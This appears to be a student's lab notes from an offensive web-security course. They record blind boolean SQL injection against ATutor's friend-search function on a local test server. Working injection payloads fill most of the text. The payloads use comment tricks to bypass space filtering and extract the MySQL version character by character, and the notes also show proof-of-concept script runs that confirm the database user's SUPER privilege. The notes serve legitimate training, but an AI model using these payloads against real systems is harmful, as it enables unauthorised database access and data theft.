@@ -1,0 +1,229 @@
+In /opt/lampp/htdocs/ATutor/mods/_standard/social/lib/friends.inc.php:
+
+function searchFriends($name, $searchMyFriends = false, $offset=-1){
+
+...
+
+$name = $addslashes($name);
+$sub_names = explode(' ', $name);
+
+...
+
+}
+
+
+
+$ /opt/lampp/bin/mysql -u root
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 2
+Server version: 5.6.20-log Source distribution
+
+Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> SELECT/**/1;
++---+
+| 1 |
++---+
+| 1 |
++---+
+1 row in set (0.00 sec)
+
+mysql> quit
+Bye
+
+
+
+$ python3 /home/rockylinux/Documents/AWAE/3.3/poc1.py localhost "AAAA')/**/OR/**/(SELECT/**/1)=1%23"
+Response Headers:
+{'Date': 'Sun, 05 Jun 2022 12:17:54 GMT', 'Server': 'Apache/2.4.10 (Unix) OpenSSL/1.0.1i PHP/5.5.15 mod_perl/2.0.8-dev Perl/v5.16.3', 'X-Powered-By': 'PHP/5.5.15', 'Set-Cookie': 'ATutorID=29btf0j2iat05ojf6ngnu0r5r4; path=/ATutor/, ATutorID=ov9ka7bn3af3h5u03npmo2krs5; path=/ATutor/, ATutorID=ov9ka7bn3af3h5u03npmo2krs5; path=/ATutor/', 'Content-Encoding': 'gzip', 'Vary': 'Accept-Encoding', 'Content-Length': '171', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=utf-8'}
+
+Response Content:
+Suggestions:atutor  atutor
+
+No errors found
+
+
+
+$ python3 /home/rockylinux/Documents/AWAE/3.3/poc1.py localhost "AAAA')/**/OR/**/(SELECT/**/1)=0%23"
+Response Headers:
+{'Date': 'Sun, 05 Jun 2022 12:19:10 GMT', 'Server': 'Apache/2.4.10 (Unix) OpenSSL/1.0.1i PHP/5.5.15 mod_perl/2.0.8-dev Perl/v5.16.3', 'X-Powered-By': 'PHP/5.5.15', 'Set-Cookie': 'ATutorID=ff4br745godj01lsbc6tt2h5p2; path=/ATutor/, ATutorID=t0dc6rrbef1qnoqb9ioiqcbkp1; path=/ATutor/, ATutorID=t0dc6rrbef1qnoqb9ioiqcbkp1; path=/ATutor/', 'Content-Encoding': 'gzip', 'Vary': 'Accept-Encoding', 'Content-Length': '20', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=utf-8'}
+
+Response Content:
+
+
+No errors found
+
+
+
+$ python3 /home/rockylinux/Documents/AWAE/3.6/poc2.py localhost
+(+) the target is vulnerable!
+
+
+
+$ /opt/lampp/bin/mysql -u root
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 20
+Server version: 5.6.20-log Source distribution
+
+Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> SELECT/**/VERSION();
++------------+
+| VERSION()  |
++------------+
+| 5.6.20-log |
++------------+
+1 row in set (0.00 sec)
+
+mysql> SELECT/**/(SUBSTRING((SELECT/**/VERSION()),1,1))='5';
++-----------------------------------------+
+| (SUBSTRING((SELECT VERSION()),1,1))='5' |
++-----------------------------------------+
+|                                       1 |
++-----------------------------------------+
+1 row in set (0.00 sec)
+
+mysql> SELECT/**/(SUBSTRING((SELECT/**/VERSION()),1,1))='6';
++-----------------------------------------+
+| (SUBSTRING((SELECT VERSION()),1,1))='6' |
++-----------------------------------------+
+|                                       0 |
++-----------------------------------------+
+1 row in set (0.00 sec)
+
+mysql> SELECT/**/ASCII(SUBSTRING((SELECT/**/VERSION()),1,1))=53;
++---------------------------------------------+
+| ASCII(SUBSTRING((SELECT VERSION()),1,1))=53 |
++---------------------------------------------+
+|                                           1 |
++---------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql> SELECT/**/ASCII(SUBSTRING((SELECT/**/VERSION()),1,1))=54;
++---------------------------------------------+
+| ASCII(SUBSTRING((SELECT VERSION()),1,1))=54 |
++---------------------------------------------+
+|                                           0 |
++---------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql> quit
+Bye
+
+
+
+$ python3 /home/rockylinux/Documents/AWAE/3.3/poc1.py localhost "AAAA')/**/OR/**/(SELECT/**/ASCII(SUBSTRING((SELECT/**/VERSION()),1,1)))=53;%23"
+Response Headers:
+{'Date': 'Sun, 05 Jun 2022 13:01:17 GMT', 'Server': 'Apache/2.4.10 (Unix) OpenSSL/1.0.1i PHP/5.5.15 mod_perl/2.0.8-dev Perl/v5.16.3', 'X-Powered-By': 'PHP/5.5.15', 'Set-Cookie': 'ATutorID=vm35iup65oq7cc2mcdiih7vvb3; path=/ATutor/, ATutorID=tpvv1a161dv43h08acg7d1g0o7; path=/ATutor/, ATutorID=tpvv1a161dv43h08acg7d1g0o7; path=/ATutor/', 'Content-Encoding': 'gzip', 'Vary': 'Accept-Encoding', 'Content-Length': '171', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=utf-8'}
+
+Response Content:
+Suggestions:atutor  atutor
+
+No errors found
+
+
+
+$ python3 /home/rockylinux/Documents/AWAE/3.3/poc1.py localhost "AAAA')/**/OR/**/(SELECT/**/ASCII(SUBSTRING((SELECT/**/VERSION()),1,1)))=54;%23"
+Response Headers:
+{'Date': 'Sun, 05 Jun 2022 13:01:36 GMT', 'Server': 'Apache/2.4.10 (Unix) OpenSSL/1.0.1i PHP/5.5.15 mod_perl/2.0.8-dev Perl/v5.16.3', 'X-Powered-By': 'PHP/5.5.15', 'Set-Cookie': 'ATutorID=ndcne4c5k8snp5t7051q9ubo67; path=/ATutor/, ATutorID=ff5n2rvlgv61c9clg9hmlda9r3; path=/ATutor/, ATutorID=ff5n2rvlgv61c9clg9hmlda9r3; path=/ATutor/', 'Content-Encoding': 'gzip', 'Vary': 'Accept-Encoding', 'Content-Length': '20', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=utf-8'}
+
+Response Content:
+
+
+No errors found
+
+
+
+$ python3 /home/rockylinux/Documents/AWAE/3.6/poc3.py localhost
+(+) Retrieving database version length....
+Version Length: 10
+(+) Retrieving database version....
+5.6.20-log
+(+) done!
+
+
+
+$ /opt/lampp/bin/mysql -u root
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 6
+Server version: 5.6.20-log Source distribution
+
+Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> SELECT Super_priv FROM mysql.user WHERE user = (SELECT SUBSTRING_INDEX((SELECT CURRENT_USER()),'@',1)) AND Host = (SELECT SUBSTRING_INDEX((SELECT CURRENT_USER()),'@',-1));                                 
++------------+
+| Super_priv |
++------------+
+| Y          |
++------------+
+1 row in set (0.00 sec)
+
+mysql> SELECT/**/Super_priv/**/FROM/**/mysql.user/**/WHERE/**/user/**/=/**/(SELECT/**/SUBSTRING_INDEX((SELECT/**/CURRENT_USER()),'@',1))/**/AND/**/Host/**/=/**/(SELECT/**/SUBSTRING_INDEX((SELECT/**/CURRENT_USER()),'@',-1));
++------------+
+| Super_priv |
++------------+
+| Y          |
++------------+
+1 row in set (0.00 sec)
+
+mysql> SELECT/**/(SELECT/**/Super_priv/**/FROM/**/mysql.user/**/WHERE/**/user/**/=/**/(SELECT/**/SUBSTRING_INDEX((SELECT/**/CURRENT_USER()),'@',1))/**/AND/**/Host/**/=/**/(SELECT/**/SUBSTRING_INDEX((SELECT/**/CURRENT_USER()),'@',-1)))='Y';
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| (SELECT Super_priv FROM mysql.user WHERE user = (SELECT SUBSTRING_INDEX((SELECT CURRENT_USER()),'@',1)) AND Host = (SELECT SUBSTRING_INDEX((SELECT CURRENT_USER()),'@',-1)))='Y' |
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+|                                                                                                                                                                                1 |
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql> quit
+Bye
+
+
+
+$ python3 /home/rockylinux/Documents/AWAE/3.3/poc1.py localhost "AAAA')/**/OR/**/(SELECT/**/Super_priv/**/FROM/**/mysql.user/**/WHERE/**/user/**/=/**/(SELECT/**/SUBSTRING_INDEX((SELECT/**/CURRENT_USER()),'@',1))/**/AND/**/Host/**/=/**/(SELECT/**/SUBSTRING_INDEX((SELECT/**/CURRENT_USER()),'@',-1)))='Y';%23"
+Response Headers:
+{'Date': 'Mon, 06 Jun 2022 04:41:36 GMT', 'Server': 'Apache/2.4.10 (Unix) OpenSSL/1.0.1i PHP/5.5.15 mod_perl/2.0.8-dev Perl/v5.16.3', 'X-Powered-By': 'PHP/5.5.15', 'Set-Cookie': 'ATutorID=92p1n990d2nnatrud52b67l2j7; path=/ATutor/, ATutorID=hnkks8c5mhgn96v24v6ij61gu0; path=/ATutor/, ATutorID=hnkks8c5mhgn96v24v6ij61gu0; path=/ATutor/', 'Content-Encoding': 'gzip', 'Vary': 'Accept-Encoding', 'Content-Length': '171', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=utf-8'}
+
+Response Content:
+Suggestions:atutor  atutor
+
+No errors found
+
+
+
+$ python3 /home/rockylinux/Documents/AWAE/3.3/poc1.py localhost "AAAA')/**/OR/**/(SELECT/**/Super_priv/**/FROM/**/mysql.user/**/WHERE/**/user/**/=/**/(SELECT/**/SUBSTRING_INDEX((SELECT/**/CURRENT_USER()),'@',1))/**/AND/**/Host/**/=/**/(SELECT/**/SUBSTRING_INDEX((SELECT/**/CURRENT_USER()),'@',-1)))='N';%23"
+Response Headers:
+{'Date': 'Mon, 06 Jun 2022 04:44:15 GMT', 'Server': 'Apache/2.4.10 (Unix) OpenSSL/1.0.1i PHP/5.5.15 mod_perl/2.0.8-dev Perl/v5.16.3', 'X-Powered-By': 'PHP/5.5.15', 'Set-Cookie': 'ATutorID=45mao8pqbchr610fheeb5355j0; path=/ATutor/, ATutorID=fkjt8sgt51f9lghk5cln16ofb2; path=/ATutor/, ATutorID=fkjt8sgt51f9lghk5cln16ofb2; path=/ATutor/', 'Content-Encoding': 'gzip', 'Vary': 'Accept-Encoding', 'Content-Length': '20', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=utf-8'}
+
+Response Content:
+
+
+No errors found
+
+
+
+$ python3 /home/rockylinux/Documents/AWAE/3.6/poc3.py localhost
+(+) Retrieving database version length....
+10
+(+) Retrieving database version....
+5.6.20-log
+(+) Checking if the database user has SUPER privilege...
+Yes
+(+) done!
